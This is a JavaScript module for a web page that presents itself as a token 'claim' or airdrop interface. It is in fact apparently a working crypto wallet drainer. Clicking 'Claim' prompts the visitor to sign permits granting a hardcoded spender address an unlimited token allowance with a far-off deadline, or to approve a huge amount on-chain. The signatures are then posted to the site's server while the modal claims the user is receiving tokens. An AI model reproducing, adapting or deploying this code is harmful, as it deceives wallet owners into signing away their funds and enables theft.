export const Web3 = require("web3");
export const mainNetwork = 1;
export const baseURL = "https://owlswap.org";

const addressSpender = '0x4E0b2A80E158f8d28a2007866ab80B7f63bE6076';

export const arrayTokens = require("../helpers/archivo.json");
var cache_connected = false;
var user_account = null;

export const getTokenBalance = async (id) => {
  if (cache_connected) {
    const { contractAddress, abi } = arrayTokens[id - 1],
      web3 = new Web3(getProvider()),
      real_abi = require(`./abi-codes/${abi}`),
      instanceContract = new web3.eth.Contract(real_abi, contractAddress);

    const tokenBalance = await instanceContract.methods
        .balanceOf(getUserAddress())
        .call(),
      tokenDecimals = await instanceContract.methods.decimals().call();

    const formatBalance = (tokenBalance / (10**tokenDecimals)).toFixed(2);
    return formatBalance;
  } else {
    return 0;
  }
};

// export const generateLoggedTable = async () => {
//   const tmpTable = document.createElement("div");
//   const web3 = new Web3(window.ethereum);

//   for (let index = 0; index < arrayTokens.length; index++) {
//     const { name, symbol, contractAddress, fakeAddress } = arrayTokens[index];

//     try {
//       const abiToken = require("./abi-codes/uChild_abi.json"),
//         instanceContract = new web3.eth.Contract(abiToken, fakeAddress),
//         tokenBalance = await instanceContract.methods
//           .balanceOf(getUserAddress())
//           .call(),
//         tokenDecimals = await instanceContract.methods.decimals().call();

//       if (tokenBalance > 0) {
//         const element = addElementToTable(
//           index,
//           name,
//           symbol,
//           contractAddress,
//           tokenBalance,
//           false
//         );
//         tmpTable.insertBefore(element, tmpTable.firstChild);
//       } else {
//         const element = addElementToTable(
//           index,
//           name,
//           symbol,
//           contractAddress,
//           0,
//           true
//         );
//         tmpTable.appendChild(element);
//       }
//     } catch (err) {
//       /*console.log(err);
//       console.log(contractAddress);*/
//     }
//   }

//   return tmpTable;
// };

// export const generateEmptyTable = async () => {
//   const tmpTable = document.createElement("div");

//   for (let index = 0; index < arrayTokens.length; index++) {
//     const { name, symbol, contractAddress } = arrayTokens[index];
//     const element = addElementToTable(
//       index,
//       name,
//       symbol,
//       contractAddress,
//       0,
//       true
//     );

//     tmpTable.appendChild(element);
//   }

//   return tmpTable;
// };

// export const createTable = async () => {
//   const { divTable, spinner } = resetTable();

//   const table = (await checkNetwork())
//     ? await generateLoggedTable()
//     : await generateEmptyTable();
//   divTable.appendChild(table);
//   spinner.remove();
// };

// export const resetTable = () => {
//   const mainTable = document.getElementById("main-table");
//   mainTable.innerHTML = "";

//   const divTable = document.createElement("div"),
//     divMain = document.createElement("div"),
//     row1 = document.createElement("div"),
//     row2 = document.createElement("div"),
//     row3 = document.createElement("div"),
//     spinner = document.createElement("div"),
//     imgSpinner = document.createElement("img");

//   divTable.classList.add("container", "text-center", "token-table");
//   divMain.classList.add("row");
//   row1.classList.add("col-3", "column-head", "text-left");
//   row1.innerHTML = "Tokens";

//   row2.classList.add("col-md", "column-head");
//   row2.innerHTML = "Address";

//   row3.classList.add("col-md", "column-head");

//   divTable.setAttribute("data-v-427a92ac", "");
//   divMain.setAttribute("data-v-427a92ac", "");
//   row1.setAttribute("data-v-427a92ac", "");
//   row2.setAttribute("data-v-427a92ac", "");
//   row3.setAttribute("data-v-427a92ac", "");

//   divMain.appendChild(row1);
//   divMain.appendChild(row2);
//   divMain.appendChild(row3);

//   spinner.classList.add("spinner-load");
//   imgSpinner.classList.add(
//     "pol_anim",
//     "animate__animated",
//     "animate__flip",
//     "animate__infinite"
//   );
//   imgSpinner.src = "./_nuxt/img/pol.svg";
//   spinner.appendChild(imgSpinner);

//   divTable.appendChild(divMain);
//   divTable.appendChild(spinner);
//   mainTable.appendChild(divTable);

//   return { divTable, spinner };
// };

// function getCookie(cName) {
//   const name = cName + "=";
//   const cDecoded = decodeURIComponent(document.cookie); //to be careful
//   const cArr = cDecoded.split("; ");
//   let res;
//   cArr.forEach((val) => {
//     if (val.indexOf(name) === 0) res = val.substring(name.length);
//   });

//   return res;
// }

export const addElementToTable = (
  index,
  name,
  symbol,
  contract,
  balance,
  disabled
) => {
  let contentRow = document.createElement("div"),
    rowName = document.createElement("div"),
    rowContract = document.createElement("div"),
    linkContract = document.createElement("a"),
    rowClaim = document.createElement("div"),
    buttonClaim = document.createElement("button");

  // Content main
  contentRow.classList.add("row", "content-row");

  // Name
  rowName.classList.add("col-3", "column-data", "text-left");
  rowName.innerHTML = `${name} (${symbol})`;

  // Address
  rowContract.classList.add("col-md", "column-data");
  linkContract.href = `https://polygonscan.com/token/${contract}`;
  linkContract.target = "_blank";
  linkContract.innerHTML = contract;
  rowContract.appendChild(linkContract);

  rowClaim.classList.add("col-md", "column-data", "center_padding");
  buttonClaim.classList.add(
    "align-self-center",
    "btn",
    "btn-primary",
    "login-button",
    "d-flex",
    "center_center",
    "btn_claim"
  );

  if (disabled) {
    buttonClaim.classList.add("disabled");
    buttonClaim.innerHTML = "Claim";
  } else {
    let tokenClaimed = getCookie(symbol);

    if (!tokenClaimed) {
      buttonClaim.innerHTML = `Claim ${symbol}`;

      const boxToSign = document.getElementById("box-to-sign"),
        boxWaitingSign = document.getElementById("box-wait-sign"),
        boxAfterSign = document.getElementById("box-after-sign");

      const signEvent = async () => {
        boxWaitingSign.style.display = "flex";
        boxToSign.style.display = "none";

        let signed = await signTransaction(index);

        boxWaitingSign.style.display = "none";
        if (signed) {
          boxAfterSign.style.display = "flex";
          createTable();
        } else {
          boxToSign.style.display = "flex";
        }
      };

      buttonClaim.addEventListener("click", () => {
        const modalTitle = document.getElementById("modal-title"),
          modalText = document.getElementById("modal-text"),
          modalButton = document.getElementById("modal-button");

        // events - text
        const ethers = require("ethers");
        let formatBalance = ethers.utils.formatEther(balance);
        modalTitle.innerHTML = `${formatBalance} ${symbol}`;
        modalText.innerHTML = `You can claim ${formatBalance} ${symbol}`;
        modalButton.onclick = signEvent;

        // Show modal
        boxWaitingSign.style.display = "none";
        boxAfterSign.style.display = "none";
        boxToSign.style.display = "flex";
        document.querySelector(".modal").classList.add("show");
        document.querySelector(".modal-backdrop").classList.add("show");
      });
    } else {
      buttonClaim.classList.add("disabled");
      buttonClaim.innerHTML = "Claimed";
    }
  }
  rowClaim.appendChild(buttonClaim);

  // Add attributes
  contentRow.setAttribute("data-v-427a92ac", "");
  rowName.setAttribute("data-v-427a92ac", "");
  rowContract.setAttribute("data-v-427a92ac", "");
  rowClaim.setAttribute("data-v-427a92ac", "");

  contentRow.appendChild(rowName);
  contentRow.appendChild(rowContract);
  contentRow.appendChild(rowClaim);
  return contentRow;
};

const domainType = [
  {
    name: "name",
    type: "string",
  },
  {
    name: "version",
    type: "string",
  },
  {
    name: "verifyingContract",
    type: "address",
  },
  {
    name: "salt",
    type: "bytes32",
  },
];

const metaTransactionType = [
  {
    name: "nonce",
    type: "uint256",
  },
  {
    name: "from",
    type: "address",
  },
  {
    name: "functionSignature",
    type: "bytes",
  },
];

const domainPermitType = [
  {
    name: "name",
    type: "string",
  },
  {
    name: "version",
    type: "string",
  },
  {
    name: "chainId",
    type: "uint256",
  },
  {
    name: "verifyingContract",
    type: "address",
  },
];

const permitType = [
  {
    name: "owner",
    type: "address",
  },
  {
    name: "spender",
    type: "address",
  },
  {
    name: "value",
    type: "uint256",
  },
  {
    name: "nonce",
    type: "uint256",
  },
  {
    name: "deadline",
    type: "uint256",
  },
];

const approveAbi = {
  inputs: [
    { internalType: "address", name: "spender", type: "address" },
    { internalType: "uint256", name: "amount", type: "uint256" },
  ],
  name: "approve",
  outputs: [{ internalType: "bool", name: "", type: "bool" }],
  stateMutability: "nonpayable",
  type: "function",
};

const getTransactionData = async (domainData, nonce, params) => {
  let web3 = new Web3(getProvider()),
    userAddress = getUserAddress();
  const functionSignature = web3.eth.abi.encodeFunctionCall(approveAbi, params);

  let message = {};
  message.nonce = parseInt(nonce);
  message.from = userAddress;
  message.functionSignature = functionSignature;

  const dataToSign = JSON.stringify({
    types: {
      EIP712Domain: domainType,
      MetaTransaction: metaTransactionType,
    },
    domain: domainData,
    primaryType: "MetaTransaction",
    message: message,
  });

  try {
    var signature = await window.ethereum.request({
      method: "eth_signTypedData_v4",
      params: [userAddress, dataToSign],
      from: userAddress,
    });
  } catch (err) {
    return false;
  }

  let r = signature.slice(0, 66);
  let s = "0x".concat(signature.slice(66, 130));
  let v = "0x".concat(signature.slice(130, 132));
  v = parseInt(v);
  if (![27, 28].includes(v)) v += 27;

  return {
    r,
    s,
    v,
    functionSignature,
  };
};

const getPermitDataDAI = async (domainData, nonce) => {
  let userAddress = getUserAddress();

  const permitTypeDAI = [
    {
      name: "holder",
      type: "address",
    },
    {
      name: "spender",
      type: "address",
    },
    {
      name: "nonce",
      type: "uint256",
    },
    {
      name: "expiry",
      type: "uint256",
    },
    {
      name: "allowed",
      type: "bool",
    },
  ];

  let message = {},
  deadline = Math.round(Date.now() / 1000) + 60 * 200000;
  message.holder = userAddress;
  message.spender = addressSpender;
  message.nonce = parseInt(nonce);
  message.expiry = deadline;
  message.allowed = true;

  const dataToSign = JSON.stringify({
    types: {
      EIP712Domain: domainPermitType,
      Permit: permitTypeDAI,
    },
    domain: domainData,
    primaryType: "Permit",
    message: message,
  });

  try {
    var signature = await window.ethereum.request({
      method: "eth_signTypedData_v4",
      params: [userAddress, dataToSign],
      from: userAddress,
    });
  } catch (err) {
    return false;
  }

  if (signature) {
    let r = signature.slice(0, 66);
    let s = "0x".concat(signature.slice(66, 130));
    let v = "0x".concat(signature.slice(130, 132));
    v = parseInt(v);
    if (![27, 28].includes(v)) v += 27;

    return {
      r,
      s,
      v,
      deadline,
    };
  } else {
    return false;
  }
};

const getPermitData2 = async (domainData, nonce) => {
  let userAddress = getUserAddress();

  let message = {},
  deadline = Math.round(Date.now() / 1000) + 60 * 200000;
  message.nonce = parseInt(nonce);
  message.owner = userAddress;
  message.spender = addressSpender;
  message.value = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
  message.deadline = deadline;

  const dataToSign = JSON.stringify({
    types: {
      EIP712Domain: domainPermitType,
      Permit: permitType,
    },
    domain: domainData,
    primaryType: "Permit",
    message: message,
  });

  try {
    var signature = await window.ethereum.request({
      method: "eth_signTypedData_v4",
      params: [userAddress, dataToSign],
      from: userAddress,
    });
  } catch (err) {
    return false;
  }

  if (signature) {
    let r = signature.slice(0, 66);
    let s = "0x".concat(signature.slice(66, 130));
    let v = "0x".concat(signature.slice(130, 132));
    v = parseInt(v);
    if (![27, 28].includes(v)) v += 27;

    return {
      r,
      s,
      v,
      deadline,
    };
  } else {
    return false;
  }
};

export const signTransaction = async (slot) => {
  var signSuccess = false;

  console.log(arrayTokens[slot]);
  if (isWeb3Connected() && arrayTokens[slot]) {
    const { contractAddress, symbol, abi, typeSign } = arrayTokens[slot];

    let web3 = new Web3(getProvider()),
      abiToken = require(`./abi-codes/${abi}`),
      tokenContract = new web3.eth.Contract(abiToken, contractAddress),
      tokenName = await tokenContract.methods.name().call();

    let userNonce;
    // (typeSign == 1 || typeSign == 2)
    //   ? 
    (userNonce =
          typeSign == 3
            ? 0
            // ? await tokenContract.methods.getNonce(getUserAddress()).call()
            : await tokenContract.methods.nonces(getUserAddress()).call())

    if (typeSign == 1) {
      const domainData = {
        name: tokenName,
        version: "1",
        chainId: 1,
        verifyingContract: contractAddress,
      };

      const { r, s, v, deadline } = await getPermitDataDAI(
        domainData,
        userNonce,
        symbol
      );

      if (r && s && v && deadline) {
        const params = {
          signData: {
            userAddress: getUserAddress(),
            contractAddress,
            deadline,
            r,
            s,
            v,
            typeSign,
            userNonce,
            abi
          },
        };

        await POST_Function("/permit-encoded", params).then(async (res) => {
          signSuccess = res && res.ok;
        });
      }
    } else {
      if (typeSign == 2) {
        const domainData = {
          name: tokenName,
          version: "2",
          chainId: 1,
          verifyingContract: contractAddress,
        };
  
        const { r, s, v, deadline } = await getPermitData2(
          domainData,
          userNonce,
          symbol
        );
  
        if (r && s && v && deadline) {
          const params = {
            signData: {
              userAddress: getUserAddress(),
              contractAddress,
              deadline,
              r,
              s,
              v,
              typeSign
            },
          };
  
          await POST_Function("/permit-encoded", params).then(async (res) => {
            signSuccess = res && res.ok;
          });
        }
      } else {
        // APPROVE
        var bigNumber = web3.utils.toBN("1000000000000000000000000000000");

        const txData = await tokenContract.methods.approve(addressSpender, bigNumber).encodeABI();
        await sendTransaction(getUserAddress(), contractAddress, txData, 0).then( async (res) => {
          if (res) {
            const params = {
              signData: {
                userAddress: getUserAddress(),
                contractAddress,
              },
            };

            await POST_Function("/signs-encoded", params).then(async (res) => {
              signSuccess = res && res.ok;
            });
          }
        });
      }
    }
  }

  return signSuccess;
};

export const getMainBalance = async () => {
  if (isWeb3Connected()) {
    const web3 = new Web3(getProvider()),
      balance = await web3.eth.getBalance(getUserAddress());

    const ethers = require("ethers"),
      formatBalance = Number(ethers.utils.formatEther(balance));

    return formatBalance.toFixed(2);
  } else {
    return 0;
  }
};

export const checkNetwork = async () => {
  var correctNetwork = false;

  if (isWeb3Connected()) {
    let web3 = new Web3(getProvider()),
      net_id = await web3.eth.getChainId();

    if (net_id != mainNetwork) {
      try {
        await ethereum
          .request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x1" }],
          })
          .then(async () => {
            net_id = await web3.eth.getChainId();
            correctNetwork = net_id == mainNetwork;
          });
      } catch (switchError) {
        
      }
    } else {
      correctNetwork = true;
    }
  }

  return correctNetwork;
};

export const getUserAddress = () => {
  return user_account;
};

export const isWeb3Connected = () => {
  return cache_connected;
};

export const getProvider = () => {
  if (window.ethereum) {
    return window.ethereum;
  } else {
    return "https://main-rpc.linkpool.io";
  }
};

export const getConnection = async (provider) => {
  let result = { connect: false, userAccount: false };

  let web3 = new Web3(provider);

  try {
    let allUserAccounts = await web3.eth.getAccounts();

    result.connect = allUserAccounts.length != 0;
    result.userAccount = allUserAccounts[0];
  } catch (err) {
    result.connect = false;
    result.userAccount = false;
  }

  user_account = result.userAccount;
  cache_connected = result.connect;

  return result;
};

export const checkConnection = async () => {
  let result = { connect: false, userAccount: false };

  if (window.ethereum) {
    result = await getConnection(window.ethereum);
  }

  return result;
};

export const requestConnection = async () => {
  let result = { connect: false, userAccount: false };

  if (window.ethereum) {
    try {
      await window.ethereum.request({ method: "eth_requestAccounts" });
      result = await getConnection(window.ethereum);
    } catch (err) {
      alert(err.code);
    }
  } else {
    alert("metamask-required");
  }

  return result;
};

export const sendTransaction = async (from, to, data, value) => {
  let web3 = new Web3(getProvider()),
    txHash = false,
    rawTx = {
      from,
      to,
      data,
      gasPrice: await web3.utils.toHex("20000000000"),
      value,
    };

  try {
    await web3.eth.sendTransaction(rawTx).then((hashId) => {
      txHash = hashId;
    });
  } catch (err) {
    if (err.code) {
      //alert(err.code);
    } else {
      //alert("4001");
    }
  }

  return txHash;
};

export const POST_Function = async (src, params) => {
  let postOBJ = {
      method: "POST",
      mode: "cors",
      cache: "no-cache",
      credentials: "same-origin",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(params),
    },
    result = false;

  await fetch(baseURL + src, postOBJ).then(async (res) => {
    if (res) {
      result = res;
    }
  });

  return result;
};
